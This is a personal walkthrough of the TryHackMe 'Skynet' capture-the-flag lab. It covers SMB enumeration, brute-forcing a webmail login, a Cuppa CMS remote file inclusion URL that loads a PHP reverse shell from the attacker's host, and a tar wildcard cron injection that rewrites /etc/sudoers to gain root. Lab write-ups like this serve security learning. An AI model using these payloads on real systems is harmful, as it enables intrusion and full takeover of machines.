# TryHackMe - Skynet  
___________________________

This room continues my journey down the Offensive Security Path on [TryHackMe](https://tryhackme.com/). This is a Terminator themed room, and I'm excited to see what's in store.

## nmap scan  

The first step is to run a typical nmap scan on the box to see what services are running. Here's the reults of the scan.

Looks like we've got `ssh`, `http`, as well as `smb` and `imap`. It also appears that the system is running linux.


## SMB Enumeration  

There's a lot to look at but the first thing I think is interesting is the `smb`, but I'm going to run `enum4linux` to gain some initial knowledge about the shares among other things like usernames.  
<br>
<br>

![](assets/images/skynet/skynet_enum4linux.png)
<br>
<br>

As we can see there's an `anonymous` smb share that we can access. Using `smbmap` we can see what's all located inside of the anonymous file share. From there we can see a file called `attention.txt`.
<br>
<br>

![](assets/images/skynet/skynet_smb.png)
<br>
<br>

```
cat 10.10.29.100-anonymous_attention.txt
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

The other interesting thing is the directory labeled `logs`. It contains three files, but it appears that only one of the files, `log1.txt`, has anything in it. Opening up the log1.txt reveals a list of what looks like passwords.
<br>
<br>

## Web Enumeration

After trying the passwords on user `milesdyson`'s smb share and getting no luck. I tried my hand at the website running on port 80. I ran gobuster and the site and got the following in return:

```
/admin (Status: 301)
/css (Status: 301)
/js (Status: 301)
/config (Status: 301)
/ai (Status: 301)
/squirrelmail (Status: 301)
```

The `admin` page got us nowhere, but the `squirrelmail` page redirected to a login. Let's see if burpsuite can get us into `milesdyson`'s email.
<br>
<br>

<br>
<br>

`cyborg007haloterminator` looks promising because the response is different from the others. Trying it gains us access to `milesdyson`'s email which has a very interesting email about an `smb` password reset.
<br>
<br>

![](assets/images/skynet/skynet_smbmiles.png)
<br>
<br>

The password for his smb share is )s{A&2Z=F^n_E.B\`. We can login to the smbshare with milesdyson's creds by typing in:

`smbclient //10.10.132.87/milesdyson -U milesdyson`

followed by his password. Inside we see quite the list of pdfs on neural nets and the like. Anyway, there is a directory called `notes` that looks promising. We can `cd` into that and see all kinds of crazy notes, but one of them is `important.txt`. We can grab that file with `get important.txt`. The file contains:
<br>
<br>

```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```
<br>
<br>

This to-do list shows us that the website has a beta CMS (content management system). That's always a good place to look as an attacker. Navigating to the directory shows us:
<br>
<br>

<br>
<br>

Nothing much going on here either on the page itself or in the source code. I think it's time to run `gobuster` and see what we can find out.
<br>
<br>

```

The only directory that gobuster got a hit on was administrator so we'll take a look there. Once we get there we're greeted with a login to `Cuppa CMS`. Researching Cuppa CMS reveals some vulnerabilities. The most enticing is the remote file inclusion. We can add this to our cuppa loin url in order to call back a shell to our attacking machine.
<br>
<br>

`http://10.10.141.144/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<attacking-ip>:<port>/php-reverse-shell.php`
<br>
<br>

![](assets/images/skynet/skynet_initialshell.png)
<br>
<br>

Once on the victim machine I figured out that I can quickly switch to user `milesdyson` with the password recovered from before. From here it's an easy grab for `user.txt`. There's also something interesting going on with the backup script. Checking out crontab it appears to be running every 30 seconds. We should try to hijack this and get a reverse shell as root.
<br>
<br>

![](assets/images/skynet/skynet_su.png)
<br>
<br>

That tar command looks enticing. If we cd into the `/var/www/html` we can construct a script that allows the user milesdyson to run all commands as sudo. As it turns out only the `www-data` user can write to that directory soooo time to switch back to that user and run the following commands (idea for priv esc came from [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) and from [this article from int0x33](https://medium.com/@int0x33/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e)).
<br>
<br>

```
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
echo "" > "--checkpoint-action=exec=sh privesc.sh"
echo "" > --checkpoint=1
```
<br>
<br>

After 30 seconds we can run our typical `sudo -l` command and see that we're able to run any command as sudo without a password.
